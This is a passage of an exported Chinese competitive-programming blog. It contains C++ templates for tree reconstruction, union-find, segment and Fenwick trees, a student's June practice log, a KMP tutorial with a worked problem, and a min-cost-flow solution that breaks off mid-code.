<h2 id="前序-中序→重建"><a href="#前序-中序→重建" class="headerlink" title="前序+中序→重建"></a>前序+中序→重建</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Build_Frist_to_Second</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span><span class="comment">//前序+中序→重建</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=++now;</span><br><span class="line">        tree[This].ID=a[i];</span><br><span class="line">        tree[This].leftchild=Build_Frist_to_Second(i-la,la,lb+<span class="number">1</span>);</span><br><span class="line">        tree[This].rightchild=Build_Frist_to_Second(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb+i-la+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> This;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="后序-中序→重建"><a href="#后序-中序→重建" class="headerlink" title="后序+中序→重建"></a>后序+中序→重建</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Build_Second_to_Third</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> la,<span class="keyword">int</span> lb)</span><span class="comment">//后序+中序→重建</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=la;i&lt;=la+n<span class="number">-1</span>;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]==b[lb])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=++now;</span><br><span class="line">        tree[This].ID=a[i];</span><br><span class="line">        tree[This].leftchild=Build_Second_to_Third(i-la,la,lb-n-la+i);</span><br><span class="line">        tree[This].rightchild=Build_Second_to_Third(la+n-i<span class="number">-1</span>,i+<span class="number">1</span>,lb<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> This;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h1><h2 id="并查集递归版本（数据量大了会爆栈）"><a href="#并查集递归版本（数据量大了会爆栈）" class="headerlink" title="并查集递归版本（数据量大了会爆栈）"></a>并查集递归版本（数据量大了会爆栈）</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//并查集递归版本（数据量大了会爆栈）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(father[x]==x) <span class="keyword">return</span> x;</span><br><span class="line">    father[x]=Getfather(father[x]);</span><br><span class="line">    <span class="keyword">return</span> father[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="并查集while循环版本"><a href="#并查集while循环版本" class="headerlink" title="并查集while循环版本"></a>并查集while循环版本</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//并查集while循环版本</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Fanily_father=x;</span><br><span class="line">    <span class="keyword">while</span>(father[Fanily_father]!=Fanily_father)</span><br><span class="line">    Fanily_father=father[Fanily_father];</span><br><span class="line">    <span class="keyword">while</span>(Fanily_father!=x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=father[x];</span><br><span class="line">        father[x]=Fanily_father;</span><br><span class="line">        x=This;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Fanily_father;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="并查集的初始化"><a href="#并查集的初始化" class="headerlink" title="并查集的初始化"></a>并查集的初始化</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Father_Firstly</span><span class="params">()</span><span class="comment">//并查集的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    father[i]=i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="并查集的合并"><a href="#并查集的合并" class="headerlink" title="并查集的合并"></a>并查集的合并</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">together</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span><span class="comment">//并查集的合并</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    father[Getfather(y)]=Getfather(x);</span><br><span class="line">    <span class="comment">//这里合并的是两个集合（集合可以只有一个元素）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><h2 id="查找最大值："><a href="#查找最大值：" class="headerlink" title="查找最大值："></a>查找最大值：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(y&lt;Left||x&gt;Right) <span class="keyword">return</span> <span class="number">-123456789</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=Left&amp;&amp;y&gt;=Right) <span class="keyword">return</span> a[Root];</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> First=Search(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> Second=Search(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> max(First,Second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="修改值："><a href="#修改值：" class="headerlink" title="修改值："></a>修改值：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;Left||x&gt;Right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left==Right)</span><br><span class="line">    &#123;</span><br><span class="line">        a[Root]=y;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    Change(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    Change(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    a[Root]=max(a[Root*<span class="number">2</span>],a[Root*<span class="number">2</span>+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二叉索引树"><a href="#二叉索引树" class="headerlink" title="二叉索引树"></a>二叉索引树</h1><h2 id="修改代码："><a href="#修改代码：" class="headerlink" title="修改代码："></a>修改代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> add)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        c[x]+=add;</span><br><span class="line">        x+=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查询代码："><a href="#查询代码：" class="headerlink" title="查询代码："></a>查询代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Question</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>树结构</tag>
        <tag>模板</tag>
      </tags>
  </entry>
  <entry>
    <title>Jun刷题柱</title>
    <url>/2017/06/03/0260dd93531c/</url>
    <content><![CDATA[<blockquote>
<p>转段考试的成绩已经出来了，还是老样子，年级1000+，所以说，为了暑假可以在机房学到更多的知识，未来一个月，我要真的在文化课方面进行努力了，我已经做好了不来机房的觉悟了，加油吧，用自己每一天的一点一点努力换来回报。</p>
</blockquote>
<h1 id="刷题柱"><a href="#刷题柱" class="headerlink" title="刷题柱"></a>刷题柱</h1><p>Jun/1 （转段考试）</p>
<p>Jun/2 五道题：P1733，P1672，P1673，P1674，P1675；</p>
<p>Jun/3 两道题：P1361，P1362；</p>
<p>Jun/4 被赶回去学文化课（偷偷看了Trie树和AC自动机）</p>
<p>Jun/5 被赶回去学文化课（偷偷留在机房补了补博客）</p>
<p>Jun/6 高考放假</p>
<p>Jun/7 高考放假</p>
<p>Jun/8 高考放假</p>
<p>Jun/9 被赶回去学文化课</p>
<p>Jun/10 被赶回去学文化课</p>
<p>Jun/11 被赶回去学文化课</p>
<p>Jun/12 被赶回去学文化课</p>
<p>Jun/13 被赶回去学文化课</p>
<p>Jun/14 被赶回去学文化课</p>
<p>Jun/15 被赶回去学文化课</p>
<p>Jun/16 被赶回去学文化课</p>
<p>Jun/17 被赶回去学文化课</p>
<p>Jun/18 被赶回去学文化课</p>
<p>Jun/19 被赶回去学文化课</p>
<p>Jun/20 被赶回去学文化课</p>
<p>Jun/21 被赶回去学文化课</p>
<p>Jun/22 被赶回去学文化课</p>
<p>Jun/23 被赶回去学文化课</p>
<p>Jun/24 被赶回去学文化课</p>
<p>Jun/25 被赶回去学文化课</p>
<p>Jun/26 被赶回去学文化课</p>
<p>Jun/27 被赶回去学文化课</p>
<p>Jun/28 被赶回去学文化课</p>
<p>Jun/29 被赶回去学文化课</p>
<p>Jun/30 被赶回去学文化课</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>刷题柱</tag>
      </tags>
  </entry>
  <entry>
    <title>KMP算法</title>
    <url>/2017/06/03/05f6609b6f48/</url>
    <content><![CDATA[<h1 id="说在前面："><a href="#说在前面：" class="headerlink" title="说在前面："></a>说在前面：</h1><p>我要开字符串了，加油吧！↖(^ω^)↗</p>
<h1 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1><blockquote>
<p>KMP算法用来解决的问题就是字符串匹配的问题（感觉和搜索引擎有些像），用来查找两个字符串中的子串归属的问题，感觉就像找关键字QAQ，不同于 O(N*M) 的暴力来说，KMP算法的复杂度为 O(n+m) 效率还是挺高的。</p>
</blockquote>
<blockquote>
<p>KMP算法的核心就是一个预处理，全靠一个叫Next的数组，他会告诉你在匹配失败的时候，应该回到那里进行再次匹配。这样可以节约很多的时间，但是实际感觉KMP的算法并不能快非常多，所以说字符串的处理是非常重要的，感觉光读入一个字符串所需要的时间都够 KMP 算法跑好几遍了……</p>
</blockquote>
<blockquote>
<p>具体原因请看《HAOI2017相同暴力算法为何差距如此之大》，一个80分一个10分，具体原因竟是C++的string的锅。</p>
</blockquote>
<h1 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h1><p>我们在平常进行字符串查找的算法中，一般是直接进行枚举比对，但是如果当前比对错误，就直接在下一位从首位开始了，这无疑是浪费啊，如果我们能接着一段显然已经匹配好的进行匹配，无疑可以节约很多的时间。</p>
<p>而KMP算法之所以跑的飞快就是充分利用了目标字符串的性质（比如里面部分字符串的重复性，即使不存在重复字段，在比较时，实现最大的移动量）。</p>
<p>考察目标字符串ptr： <code>ababaca</code></p>
<p>这里我们要计算一个长度为m的转移函数next。next数组的含义就是一个固定字符串的最长前缀和最长后缀相同的长度。比如：</p>
<ul>
<li><p><code>abcjkdabc</code>，那么这个数组的最长前缀和最长后缀相同必然是abc。</p>
</li>
<li><p><code>cbcbc</code> 最长前缀和最长后缀相同是 <code>cbc</code>。</p>
</li>
<li><p><code>abcbc</code> 最长前缀和最长后缀相同是不存在的。</p>
</li>
</ul>
<p><strong>注意最长前缀：是说以第一个字符开始，但是不包含最后一个字符。 比如aaaa相同的最长前缀和最长后缀是aaa。</strong></p>
<ul>
<li><p>对于目标字符串ptr，ababaca，长度是7，所以next[0]，next[1]，next[2]，next[3]，next[4]，next[5]，next[6]分别计算的是a，ab，aba，abab，ababa，ababac，ababaca的相同的最长前缀和最长后缀的长度。</p>
</li>
<li><p>由于a，ab，aba，abab，ababa，ababac，ababaca的相同的最长前缀和最长后缀是“”，“”，“a”，“ab”，“aba”，“”，“a”,所以next数组的值是[-1,-1,0,1,2,-1,0]，这里-1表示不存在，0表示存在长度为1，2表示存在长度为3。这是为了和代码相对应。</p>
</li>
</ul>
<p>比如：</p>
<p>next数组就是说一旦在某处不匹配时（下图绿色位置A和B），移动ptr字符串，使str的对应的最大后缀（红色2）和ptr对应的最大前缀（红色3）对齐，然后比较A和Ｃ。</p>
<p>next数组的值，就是下次往前移动字符串ptr的移动距离。比如next中某个字符对应的值是4，则在该字符后的下一个字符不匹配时，可以直接移动往前移动ptr 5个长度，再次进行比较判别。</p>
<p><img src="https://xorex.space/image/056.jpg"></p>
<p><img src="https://xorex.space/image/057.jpg"></p>
<p>KMP的算法还是要好好的练习一下手速和理解啊。</p>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetNext</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">-1</span>; Next[<span class="number">0</span>]=<span class="number">-1</span>;<span class="comment">//因为字符串是从0开始，所以上一位为-1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;b.size();i++)</span><br><span class="line">    &#123;<span class="comment">//Next[i]表示的是对于字符串的i号字符的前缀，和开头的元素的最长匹配是多长</span></span><br><span class="line">        <span class="keyword">while</span>((j&gt;=<span class="number">0</span>)&amp;&amp;(b[j+<span class="number">1</span>]!=b[i]))</span><br><span class="line">        j=Next[j];<span class="comment">//如果无法匹配，滚回到前面最长匹配的地方重新匹配</span></span><br><span class="line">        <span class="keyword">if</span>(b[j+<span class="number">1</span>]==b[i]) j++;<span class="comment">//如果匹配则前缀加一（j表示的是能匹配的最大长度）</span></span><br><span class="line">        Next[i]=j;<span class="comment">//确定最大匹配值也就是可以到的地方</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">KMP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">-1</span>;<span class="comment">//同样为-1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.size();i++)</span><br><span class="line">    &#123;<span class="comment">//这里a和b进行比较</span></span><br><span class="line">        <span class="keyword">while</span>((j&gt;<span class="number">-1</span>)&amp;&amp;(b[j+<span class="number">1</span>]!=a[i])) j=Next[j];</span><br><span class="line">        <span class="keyword">if</span>(b[j+<span class="number">1</span>]==a[i]) j++;</span><br><span class="line">        <span class="keyword">if</span>(j==b.size()<span class="number">-1</span>)<span class="comment">//b完全被匹配</span></span><br><span class="line">        &#123;</span><br><span class="line">            j=Next[j];</span><br><span class="line">            ans++;<span class="comment">//这里来记录个数或位置等等；</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="P1362字符串的自我匹配"><a href="#P1362字符串的自我匹配" class="headerlink" title="P1362字符串的自我匹配"></a>P1362字符串的自我匹配</h2><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>给你一个字符串，它是由某个字符串不断自我连接形成的。但是这个字符串是不确定的，现在只想知道它的最短长度是多少.</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行给出字符串的长度,1 &lt; L ≤ 1,000,000. 第二行给出一个字符串，全由小写字母组成.</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出最短的长度</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>其实这道题就是一道结论题，考察你是否仔细理解了KMP算法的本质。</p>
<ul>
<li><p>我们首先要明白 Next[i] 这个数组表示的是什么，表示的对于你在b串比配到了第i个，发现卧槽不对了，但是你又不舍得b串从头开始在下一个a串字符上再次匹配，那么Next[i]存下来的就是b串中从头到Next[i]这些字符和a串上面所匹配的地方的前Next[i]是相同的，我们只需要从b串的Next[i]处开始和a串的下一个进行匹配就好了，因为前面的是一样的啊……</p>
</li>
<li><p>所以说对于这道题，我们通过计算出来这个串的所有 Next[i] 这个数组的所有值，然后用这个串的长度n减去和自己的前缀相同的最大长度也就是Next[n]的值就好。</p>
</li>
<li><p>为什么这样就可以呢，因为这个长长的字符串是若干个子串组成的，而子串都是完整的，那么Next[n]相同的前缀就是除掉最后一个子串以外所有的串的长度。总长度减去Next[n]就是最后一个子串的长度了。</p>
</li>
</ul>
<p>算法真的是太神奇了QAQ</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> len,Next[<span class="number">1000001</span>];</span><br><span class="line"><span class="keyword">char</span> ch[<span class="number">1000001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;len);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ch);</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">-1</span>; Next[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((j&gt;<span class="number">-1</span>)&amp;&amp;(ch[j+<span class="number">1</span>]!=ch[i])) j=Next[j];</span><br><span class="line">        <span class="keyword">if</span>(ch[j+<span class="number">1</span>]==ch[i]) j++;</span><br><span class="line">        Next[i]=j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;len-Next[len<span class="number">-1</span>]<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>费用流题解</title>
    <url>/2017/06/03/2e6c3d3e5a5f/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>网络流学的真的是很爽啊，每次一道题都要敲上百行，各种模板套上去就好，费用流虽然还不是太熟练，但是也写了几道题练手。</p>
</blockquote>
<h1 id="费用流："><a href="#费用流：" class="headerlink" title="费用流："></a>费用流：</h1><p>费用流和最大流相比，就是多了费用这一点，而这种求法主要是利用SPFA进行求最短路和增广路，如果求出出来增广路，那么这不但是一个最大流，还是费用最小（最大）的费用流。</p>
<ul>
<li><p>最大流问题要求从源点S流出尽可能多的流量，流过一条或多条边，到达汇点T，且每条边上流过的流量不大于该边的流量限制，一个单位的流在某条边上产生的费用等于边的费用。而最小费用最大流问题就是要求在流量达到最大的情况下，总费用最小。</p>
</li>
<li><p>由最大流的相关知识可知，当且仅当不存在S到T的增广路时，图中的流达到最大。那么我们可以每次从S流出一个单位的流量到达T，使得这个单位流量所产生的费用最小。</p>
</li>
<li><p>从“形”的角度观察这个问题，每个单位的流在当前网络中产生的最小费用，等价于当前网络中S到T的最小权值路径的权值，即S到T最短路的长度。因此，可以用SPFA求最短路，每次选择残留网络中最短的增广路进行增广，直到不存在增广路为止，可以证明找到的最大流的费用一定最小。分析这个算法的时间复杂度，如果增广次数是w，每次SPFA算法在残留网络G上的运行时间是 SPFA(G), 那么总的复杂度就是 O(w*SPFA(G));</p>
</li>
</ul>
<blockquote>
<p>还是怕出题老师卡SPFA啊，到时候能卡成 O(N*N) 就不好玩了。</p>
</blockquote>
<h1 id="P1670传纸条"><a href="#P1670传纸条" class="headerlink" title="P1670传纸条"></a>P1670传纸条</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>小渊和小轩是好朋友也是同班同学，他们在一起总有谈不完的话题。一次素质拓展活动中，班上同学安排做成一个m行n列的矩阵，而小渊和小轩被安排在矩阵对角线的两端，因此，他们就无法直接交谈了。幸运的是，他们可以通过传纸条来进行交流。纸条要经由许多同学传到对方手里，小渊坐在矩阵的左上角，坐标(1,1)，小轩坐在矩阵的右下角，坐标(m,n)。从小渊传到小轩的纸条只可以向下或者向右传递，从小轩传给小渊的纸条只可以向上或者向左传递。</p>
</blockquote>
<ul>
<li><p>在活动进行中，小渊希望给小轩传递一张纸条，同时希望小轩给他回复。班里每个同学都可以帮他们传递，但只会帮他们一次，也就是说如果此人在小渊递给小轩纸条的时候帮忙，那么在小轩递给小渊的时候就不会再帮忙。反之亦然。</p>
</li>
<li><p>还有一件事情需要注意，全班每个同学愿意帮忙的好感度有高有低（注意：小渊和小轩的好心程度没有定义，输入时用0表示），可以用一个0-100的自然数来表示，数越大表示越好心。小渊和小轩希望尽可能找好心程度高的同学来帮忙传纸条，即找到来回两条传递路径，使得这两条路径上同学的好心程度只和最大。现在，请你帮助小渊和小轩找到这样的两条路径。</p>
</li>
</ul>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>输入第一行有2个用空格隔开的整数m和n，表示班里有m行n列（1&lt;=m,n&lt;=50）。</li>
<li>接下来的m行是一个m*n的矩阵，矩阵中第i行j列的整数表示坐在第i行j列的学生的好心程度。每行的n个整数之间用空格隔开。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出共一行，包含一个整数，表示来回两条路上参与传递纸条的学生的好心程度之和的最大值。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>这道题其实就是费用流的一个模板题，我们将这道题想成网络流的题目，在源点处将其流量限制成2，那么就确定了只有两条路可以走，这也就符合了题意，那么我们在求一遍最大流的所有路径就是可以走的路径，但是要输出两路上传递纸条学生的好心程度和最大值，那么我们在用增广路径增广的时候，优先选择路径上权值和最大的路径进行增广，但是增广的前提条件就是这里是有流的QAQ，虽然这个算法和Dinic的复杂度看起来差不多，但是我感觉没有Dinic快的说。</p>
</li>
<li><p>这个最短路的算法是基于SPFA的用三角形关系式来更新路径的最小/最大值，然后记录下来这两个点之间的更新的最后路径值，分别由两个值，LastPoint和LastEdge两个数组存储下来更新出来的最短路径（权值最大），具体方法就是每次在满足三角形关系式之后，记录下来当前点和自己链接的上一个点，然后记录下来链接的边的len的值。</p>
</li>
<li><p>记录下来路径之后，我们再进行增广路径，沿着存下来的最短路径（权值最大）更改相对应的边的流量值，然后用总的答案值 ans 加上这个最短路的（权值最大）长度，也就是从这条更新出来的的路两点之间的Value值乘上相对应的流量（可能有些题目权值不是用流量计算的，而是固定的，那么就直接在最后加上dis[T]就好了。），最后直到没有办法求出来权值最大的路径（没有增广路），就是最终要求的值了。</p>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">&#125;a[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> Link[<span class="number">20000</span>],Queue[<span class="number">200000</span>],dis[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">int</span> len,That,ans=<span class="number">0</span>,n,m,S,T;</span><br><span class="line"><span class="keyword">int</span> LastPoint[<span class="number">20000</span>],LastEdge[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">20000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> flow,<span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=-value;</span><br><span class="line">    a[len].Flow=flow;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">    a[++len].Point=x;</span><br><span class="line">    a[len].Next=Link[y];</span><br><span class="line">    a[len].Value=value;</span><br><span class="line">    a[len].Flow=<span class="number">0</span>;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    Link[y]=len;</span><br><span 